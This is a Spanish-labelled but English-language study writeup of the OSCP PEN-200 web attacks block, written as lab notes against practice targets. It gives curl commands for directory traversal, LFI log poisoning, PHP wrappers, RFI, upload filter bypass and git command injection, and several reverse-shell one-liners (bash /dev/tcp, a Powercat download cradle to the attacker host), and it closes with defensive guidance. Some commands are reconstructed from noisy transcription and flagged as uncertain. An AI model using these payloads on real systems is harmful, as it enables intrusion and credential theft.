PEN-200 CWAA — Common Web Application Attacks

Fuente: material del curso correspondiente (sin video público)

Distilled from OffSec PEN-200 (OSCP) course material (modules 26–34, Common Web Application Attacks block) — internal training reference, not for redistribution.

Objective

Complete the server-side web attack toolkit after the introduction block (writeup 03): turn read-class file-path bugs into code execution and shells, and abuse upload and command-run features of the application. The block's arc, in the course's own order:

  1. Path fundamentals — absolute vs. relative paths (/, ./, ../), the prerequisite for every file-path exploit below.
  2. Directory traversal — identify parameter-driven file references, read arbitrary files, and pivot from /etc/passwd to a user's private SSH key.
  3. Filter evasion via URL encoding — encode . as %2e to slip past ../ filters on the Samba target.
  4. Local File Inclusion (LFI) — the read-vs-execute distinction, and log poisoning: control a value Apache writes to access.log (User-Agent), plant PHP in it, include the log, get RCE and a reverse shell.
  5. PHP wrappers — php://filter (read source instead of executing it) and data:// (inline code execution).
  6. Remote File Inclusion (RFI) — host a web shell locally, include it over HTTP.
  7. File upload — executable files — bypass a PHP-extension blacklist (case tricks, alternate extensions), then a base64-encoded PowerShell reverse shell from a Windows/XAMPP target.
  8. File upload — non-executable files — combine upload with traversal in the filename to overwrite /root/.ssh/authorized_keys and log in as root over SSH.
  9. Command injection — the git clone form, a "must contain git" filter bypassed with an encoded ;, shell identification, and a Powercat reverse shell.

Recurring methodology: enumerate every link/button/parameter first, then stop testing in the browser — use curl/Burp Repeater, because browsers parse, re-encode, and reformat responses.

Target surface

Primary lab application: Mountain Desserts (mountaindesserts.com, statically mapped in /etc/hosts — no lab IP is stated in the narration; use the IP assigned by your lab gateway). Attack box is stock Kali.

Surface Detail
mountaindesserts.com (Apache/PHP, Linux) index.php + ?page= parameter (includes admin.php); LFI/log-poisoning and PHP-wrapper target. SSH on port 2222; a user offsec owns an accessible private key. A later version exposes DB credentials in admin.php source.
Samba machine (from the Vulnerability Scanning block) Known directory traversal after /cgi-bin/ in the URL; ../ filtered → encoding evasion target.
Mountain Desserts v2 (Windows, XAMPP) Upload form ("upload a picture to win a contest"); PHP-extension blacklist → executable-upload target. PowerShell reverse shell.
Mountain Desserts v3 (Linux, no PHP) index.php/admin.php removed; upload + filename traversal → authorized_keys overwrite, root SSH on port 2222.
Mountain Desserts app on port 8000 "Mountain Vaults" ⚠ (ASR; likely a Mountain Desserts variant) — git clone form, archive parameter → command injection; runs on Windows, injected commands execute in PowerShell.

Key source facts the exploits rely on:

  • Apache writes attacker-controlled User-Agent values to access.log — the poisonable sink for LFI RCE.
  • allow_url_include must be enabled for RFI and for the data:// wrapper (off by default in stock PHP).
  • The web server normally runs as a low-privilege user (www-data on Linux) — but deployments "run as root/admin to avoid permission issues" are common enough that privilege level must always be verified; the upload-traversal lab deliberately runs the app as root.
  • Kali ships PHP web shells (the course uses simple-backdoor.php: takes cmd in the cmd parameter ⚠ and runs it via system()).

Techniques

The narration describes workflows; commands below are normalized/reconstructed from the described actions (noisy ASR). Items marked ⚠ are ambiguities to re-verify in the lab. All lab credentials are [REDACTED].

1. Absolute vs. relative paths (primer)

cd /home/kali && pwd          # /home/kali
ls /                          # absolute: starts at root, works from anywhere
cat /etc/passwd               # absolute path to the classic target file
ls ../../..                   # relative: one ../ per directory level up
cat ../../../etc/passwd       # extra ../ past root are harmless — nothing is further back

That last property is exploitable: when the current working directory is unknown, a long run of ../ sequences still resolves from root.

2. Identifying and exploiting directory traversal

Identification checklist before touching the parameter: hover every button, check every link, hit every page, read page source. The demo link .../cms/login.php?language=en.html yields three facts — PHP backend (.php), a parameter whose value is a file (language=en.html → fetch en.html directly to confirm it exists server-side), and a cms subdirectory under the web root.

Case study — Mountain Desserts: the Admin link shows a "page is currently under maintenance" message inside the same page ⇒ ?page=admin.php includes content server-side. Test traversal in that parameter:

curl "http://mountaindesserts.com/index.php?page=../../../../etc/passwd"
# → passwd contents, revealing user offsec with home dir /home/offsec
curl "http://mountaindesserts.com/index.php?page=../../../../home/offsec/.ssh/id_rsa"
# → offsec's private key

The browser mangles the key's formatting; curl preserves it. Exploit chain:

# save the key to ~/dtkey, then:
chmod 600 dtkey                        # SSH refuses keys with open permissions
ssh -i dtkey -p 2222 offsec@mountaindesserts.com

3. Encoding special characters (filter evasion)

Against the Samba machine's /cgi-bin/ traversal, plain ../ fails — the sequence is routinely filtered by the web app, WAF, or web server. Encode the dots:

curl "http://<samba-target>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/etc/passwd"   # %2e = "."
# → /etc/passwd contents

Encoded representations pass filters that only match the plaintext form; the server decodes them into a valid request afterward. ⚠ Only %2e-encoding was demonstrated in the narration — double encoding (%252e) and overlong UTF-8 variants are the standard follow-ups worth trying when single encoding is caught.

4. LFI vs. directory traversal — and log poisoning to RCE

The distinction that matters:

  • Traversal = read file contents outside the web root. Including admin.php through a traversal prints its source.
  • Inclusion = the file is pulled into the application's running code and executed. Through an LFI, admin.php runs; any included file with executable content executes.

Log poisoning (goal: RCE from LFI):

  1. Find a controlled value in a log. Include /var/log/apache2/access.log ⚠ (exact log path not stated in narration) through the same ?page= parameter and review which request elements appear in the entry — the User-Agent is attacker-controlled.
  2. Poison it. In Burp Repeater, send a request to the app with the User-Agent set to a PHP snippet that takes a command parameter and runs it via system():

```php

```

  1. Execute through the inclusion. Include the log again plus the command parameter (ampersand separates the two):

bash curl "http://mountaindesserts.com/index.php?page=/var/log/apache2/access.log&command=ps"

Then remove the poisoned User-Agent from subsequent requests — each new poisoned entry inserts another snippet, so a second execution fires both. 4. Space handling. command=ls -la errors — the space breaks the context. Fix with URL encoding (%20) or $IFS (the transcript's "input field separators"). 5. Reverse shell. php system() may execute through Bourne sh, not bash — bash-only syntax dies. Wrap it: pass the full reverse-shell one-liner as an argument to bash -c "...", URL-encode everything, and catch it:

bash nc -nvlp 4444 # ...send command=bash -c "bash -i >& /dev/tcp/<kali-ip>/4444 0>&1" (URL-encoded) # → interactive shell on target

5. PHP wrappers

php://filter — read instead of execute. Wrappers access local/remote file streams; filter reads a resource (any absolute or relative path) with optional encoding. Plain inclusion of admin.php through the LFI executes it and shows only the trailing HTML; base64-encoding the stream exposes the source:

curl "http://mountaindesserts.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
# → base64 blob; decode it:
echo "<blob>" | base64 -d
# → admin.php source, containing MySQL connection credentials [REDACTED]

Use cases: source review for sensitive data (the demo leaked DB creds — reusable against the DB and for SSH password reuse) and application-logic analysis. Other encodings (e.g. ROT13) work the same way.

data:// — code execution without a poisoned file. Embeds data (plain or base64) directly into the running code — the alternative when no local writable file can be planted:

curl "http://mountaindesserts.com/index.php?page=data://text/plain,<?php system('ls'); ?>"   # URL-encoded
curl "http://mountaindesserts.com/index.php?page=data://text/plain;base64,<b64-of-snippet>"

The base64 form also bypasses WAFs that match system or other PHP keywords in plaintext. Caveat: requires allow_url_include=On — it will not work on a default PHP install.

6. Remote File Inclusion (RFI)

RFI includes files from a remote system over HTTP or SMB, executing them in the application's context. Rarer than LFI because it needs the same allow_url_include=On configuration; typical where apps load remote libraries/content.

# 1. Review the web shell (Kali: /usr/share/webshells/php/simple-backdoor.php ⚠ —
#    takes a command via its parameter, runs it via system())
# 2. Serve it:
python3 -m http.server 80
# 3. Include it over HTTP:
curl "http://mountaindesserts.com/index.php?page=http://<kali-ip>:80/simple-backdoor.php&cmd=ls"
# → command output rendered in the response

7. File upload — executable files (Windows/XAMPP target)

Where to hunt for upload mechanisms: CMS features (avatars, post attachments), career pages (CV upload), domain-specific forms (case files on a lawyer site). Never skip enumeration — some upload features are not obvious.

The v2 app accepts a .txt (not just images) — already a finding. Upload of the PHP web shell is blocked: "PHP files are not allowed", extension blacklist. Filter behavior is unknown, so probe with trial and error:

  • Alternate extensions: .phps, .php7 — legacy/special-purpose PHP extensions still mapped by modern PHP setups, often missed by blacklists checking only .php/.phtml.
  • Case variation: .pHp — blacklists frequently compare against a lowercase-only list.

The demo uses case variation:

mv simple-backdoor.php simple-backdoor.pHp   # upload succeeds
curl "http://mountaindesserts.com/uploads/simple-backdoor.pHp?cmd=<command>"
# → command output — code execution confirmed

Reverse shell from Windows: a PowerShell one-liner full of special characters is base64-encoded (PowerShell Encoding.Unicode on Kali) and executed through the shell with -enc; spaces in the URL still need %20:

nc -nvlp 80
curl "http://mountaindesserts.com/uploads/simple-backdoor.pHp?cmd=powershell%20-enc%20<b64>"
# → reverse shell in the Netcat listener

8. File upload — non-executable files (traversal in the filename)

v3 runs on Linux with no PHP (index.php/admin.php confirmed gone via curl) — uploaded files can never execute. Pivot: the upload's filename may honor relative paths.

  1. Upload test.txt through Burp Repeater; then set the filename to ../../../test.txt. The response echoes the ../ sequences — but that only proves the response echoes input, not that the path was honored (sanitization may happen server-side). With no other vector, assume it works and attack blind.
  2. Choose a target whose overwrite grants access: authorized_keys. Generate a keypair, name the public-key file authorized_keys, intercept the upload, and rewrite the filename to ../../../root/.ssh/authorized_keys. Note: apps using their own web server are often run as root/admin to dodge permission problems — always test whether the upload runs with elevated privileges.
  3. Connect:
rm ~/.ssh/known_hosts   # a different machine answers mountaindesserts.com now — stale host key breaks SSH
ssh -i id_rsa -p 2222 root@mountaindesserts.com
# → root shell via the overwritten authorized_keys

Caveat stated in the course: root SSH login is often disabled, and without read primitives (/etc/passwd is not viewable here) other users can't be enumerated — it simply is the only available target in this scenario.

9. Command injection (git-clone form)

The "Mountain Vaults" ⚠ app on port 8000 clones Git repos from a URL; the form prints the actual executed command — a strong hint the input string reaches the OS. Burp reveals the POST parameter is archive.

# baseline filter probe:
curl -X POST -d "archive=ipconfig" http://<target>:8000/
# → "command injection attempt detected"
curl -X POST -d "archive=git" http://<target>:8000/
# → git help page — bare "git" executes; the filter only requires git to be present
curl -X POST -d "archive=git%20version" http://<target>:8000/
# → "git version ... windows" ⇒ target is Windows

Bypass: commands chained with a semicolon pass, as long as git appears somewhere:

curl -X POST -d "archive=git%3Bipconfig" http://<target>:8000/     # %3B = ";"
# → git output followed by ipconfig output

Identify the executing shell with a snippet that prints cmd or powershell depending on context (URL-encoded) → PowerShell.

Reverse shell via Powercat (PowerShell netcat, shipped with Kali):

cp /usr/share/powershell-empire/... /usr/share/webshells/... powercat.ps1 ~/  ⚠ (path not stated in narration)
python3 -m http.server 80            # serve powercat.ps1
nc -nvlp 4444
curl -X POST --data-urlencode \
  "archive=git;iex(new-object net.webclient).downloadstring('http://<kali-ip>:80/powercat.ps1');powercat -c <kali-ip> -p 4444 -e cmd" \
  http://<target>:8000/
# → GET for powercat.ps1 on the HTTP server, reverse shell in the listener

(Structure per narration: a download cradle loads the Powercat function from the attacker web server, then invokes it with -c target, -p port, -e program to execute.) A direct PowerShell reverse-shell one-liner works equally well — the viable payload always depends on OS, implementation, and filtering.

Detection & defense

Defensive readings of each technique:

  • Path parameters are code. Never pass user input to filesystem APIs (include, require, file reads/writes). Use an allow-list of page IDs mapped server-side to fixed paths — the ?page=admin.php pattern is the root cause of every technique in sections 2–6.
  • Canonicalize before validating. Reject traversal sequences on the decoded, normalized path — %2e defeated a filter that matched only plaintext ../. Decode repeatedly (catch double-encoding), strip leading ../ runs after resolving the real path, and verify the final path stays inside the intended base directory (realpath containment).
  • Log values are execution sinks under LFI. Log poisoning works because raw attacker input (User-Agent) lands in an includable file. Sanitize/escape log fields, keep logs outside include paths, and don't let the app include anything from writable locations.
  • allow_url_include stays off. It single-handedly enables RFI and the data:// wrapper. allow_url_fopen should be off too unless the app genuinely fetches remote resources.
  • Extension blacklists fail (case tricks, .phps/.php7). Validate uploads by content sniffing + extension allow-list, store files outside the web root with randomized names, serve them with neutral Content-Type/Content-Disposition: attachment, and strip executable permissions.
  • Upload filenames are user input. Generate the stored filename server-side; never pass the client-supplied name to the filesystem (that's how authorized_keys landed in /root/.ssh). Run upload handlers as a dedicated unprivileged user — the lab's root-running app is the anti-pattern that made a "harmless" uploader into root compromise.
  • Command execution from input is a design failure. Use library APIs (e.g. a Git library) instead of shelling out; if unavoidable, pass arguments via argv arrays (no shell), allow-list verbs strictly (the filter's "contains git" check allowed git;anything), and run the worker with least privilege.
  • Intrusion-detection angle: traversal/encoded sequences in URLs (../, %2e%2e), system(/data:///php://filter strings in parameters, unexpected User-Agent payloads followed by log-file requests, and uploads whose response path leaves the web root are all high-signal — alert on them; none of these appear in normal traffic.
